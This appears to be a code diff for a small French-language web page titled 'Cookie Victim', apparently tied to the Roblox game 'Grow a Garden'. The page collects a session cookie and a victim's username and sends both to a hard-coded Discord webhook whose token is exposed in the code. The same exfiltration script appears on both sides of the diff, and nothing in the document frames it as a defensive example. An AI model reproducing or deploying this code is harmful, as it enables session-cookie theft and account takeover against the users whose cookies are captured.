@@ -1,28 +1,88 @@
-<script>
-  function sendToDiscord() {
-    const cookie = document.getElementById('cookie').value.trim();
-    const victim = document.getElementById('victim').value.trim();
-    const grow = document.getElementById('growGarden').checked;
-
-    if (!cookie || !victim) {
-      alert("Remplis les deux champs stp !");
-      return;
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <title>Cookie Victim</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      background-color: #222;
+      color: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding-top: 40px;
     }
+    input {
+      margin: 8px 0;
+      padding: 8px;
+      border-radius: 5px;
+      border: none;
+      width: 250px;
+    }
+    button {
+      margin-top: 12px;
+      padding: 10px 20px;
+      border-radius: 5px;
+      border: none;
+      background-color: #4caf50;
+      color: white;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #45a049;
+    }
+    label {
+      margin-top: 10px;
+      cursor: pointer;
+      user-select: none;
+    }
+    .checkbox {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+  </style>
+</head>
+<body>
+  <h2>Envoie ton Cookie et la Victime</h2>
+  
+  <input type="text" id="cookie" placeholder="Cookie : ..." />
+  <input type="text" id="victim" placeholder="Victim Username : ..." />
+  
+  <label class="checkbox">
+    <input type="checkbox" id="growGarden" />
+    Grow a garden
+  </label>
+  
+  <button onclick="sendToDiscord()">Envoyer</button>
+  
+  <script>
+    function sendToDiscord() {
+      const cookie = document.getElementById('cookie').value.trim();
+      const victim = document.getElementById('victim').value.trim();
+      const grow = document.getElementById('growGarden').checked;
 
-    const message = `🍪 **Cookie:** ${cookie}\n👤 **Victim Username:** ${victim}\n🌱 Grow a garden: ${grow ? "Oui" : "Non"}`;
+      if (!cookie || !victim) {
+        alert("Remplis les deux champs stp !");
+        return;
+      }
 
-    fetch("https://discordapp.com/api/webhooks/1395469258460496083/vF9l2TCySkA_EnrWWfBTPTrUyTM2ip8zndbcj4PTLwDml5gUOH-5WvQCwfnjpmUyayEE", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ content: message })
-    })
-    .then(() => {
-      alert("Envoyé sur Discord !");
-      // Lancer le timer de 10 minutes (600000 ms)
-      setTimeout(() => {
-        location.reload();  // Recharge la page
-      }, 600000);
-    })
-    .catch(() => alert("Erreur d'envoi."));
-  }
-</script>
+      const message = `🍪 **Cookie:** ${cookie}\n👤 **Victim Username:** ${victim}\n🌱 Grow a garden: ${grow ? "Oui" : "Non"}`;
+
+      fetch("https://discordapp.com/api/webhooks/1395469258460496083/vF9l2TCySkA_EnrWWfBTPTrUyTM2ip8zndbcj4PTLwDml5gUOH-5WvQCwfnjpmUyayEE", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: message })
+      })
+      .then(() => {
+        alert("Envoyé sur Discord !");
+        setTimeout(() => {
+          location.reload();
+        }, 600000); // 10 minutes en ms
+      })
+      .catch(() => alert("Erreur d'envoi."));
+    }
+  </script>
+</body>
+</html>
